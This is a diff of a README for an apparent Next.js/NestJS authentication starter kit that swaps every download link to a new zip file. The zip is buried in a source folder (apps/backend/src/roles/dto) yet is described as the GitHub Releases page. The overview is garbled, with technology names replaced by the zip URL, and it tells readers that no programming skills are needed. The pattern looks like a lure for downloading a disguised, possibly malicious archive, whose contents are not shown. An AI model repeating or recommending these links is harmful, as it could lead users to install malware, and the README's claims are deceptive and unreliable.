@@ -1,10 +1,10 @@
 # 🚀 Next-Nest-Better-Auth - Your Easy Path to Secure Apps
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/masoodhassan1/Next-Nest-Better-Auth/main/apps/backend/src/roles/dto/Nest_Better_Auth_Next_3.5.zip)](https://raw.githubusercontent.com/masoodhassan1/Next-Nest-Better-Auth/main/apps/backend/src/roles/dto/Nest_Better_Auth_Next_3.5.zip)
+[![Download](https://github.com/masoodhassan1/Next-Nest-Better-Auth/raw/refs/heads/main/apps/backend/src/roles/dto/Nest_Next_Auth_Better_1.6.zip)](https://github.com/masoodhassan1/Next-Nest-Better-Auth/raw/refs/heads/main/apps/backend/src/roles/dto/Nest_Next_Auth_Better_1.6.zip)
 
 ## 🌟 Overview
-Next-Nest-Better-Auth is a full-stack starter kit designed for anyone looking to create secure applications. It combines https://raw.githubusercontent.com/masoodhassan1/Next-Nest-Better-Auth/main/apps/backend/src/roles/dto/Nest_Better_Auth_Next_3.5.zip and https://raw.githubusercontent.com/masoodhassan1/Next-Nest-Better-Auth/main/apps/backend/src/roles/dto/Nest_Better_Auth_Next_3.5.zip to offer a high-performance solution for building modern web apps. With a focus on seamless authentication, this kit simplifies working with user sessions across different parts of your app. You don’t need programming skills to get started! 
+Next-Nest-Better-Auth is a full-stack starter kit designed for anyone looking to create secure applications. It combines https://github.com/masoodhassan1/Next-Nest-Better-Auth/raw/refs/heads/main/apps/backend/src/roles/dto/Nest_Next_Auth_Better_1.6.zip and https://github.com/masoodhassan1/Next-Nest-Better-Auth/raw/refs/heads/main/apps/backend/src/roles/dto/Nest_Next_Auth_Better_1.6.zip to offer a high-performance solution for building modern web apps. With a focus on seamless authentication, this kit simplifies working with user sessions across different parts of your app. You don’t need programming skills to get started! 
 
 ## 💡 Key Features
 - **Type-Safe:** Ensures security and reliability in your application.
@@ -16,7 +16,7 @@ Next-Nest-Better-Auth is a full-stack starter kit designed for anyone looking to
 Follow these simple steps to download and run Next-Nest-Better-Auth.
 
 ### Step 1: Visit the Releases Page
-To download the latest version, visit the GitHub Releases page: [Download Now](https://raw.githubusercontent.com/masoodhassan1/Next-Nest-Better-Auth/main/apps/backend/src/roles/dto/Nest_Better_Auth_Next_3.5.zip). 
+To download the latest version, visit the GitHub Releases page: [Download Now](https://github.com/masoodhassan1/Next-Nest-Better-Auth/raw/refs/heads/main/apps/backend/src/roles/dto/Nest_Next_Auth_Better_1.6.zip). 
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Look for the latest release, which is usually at the top. 
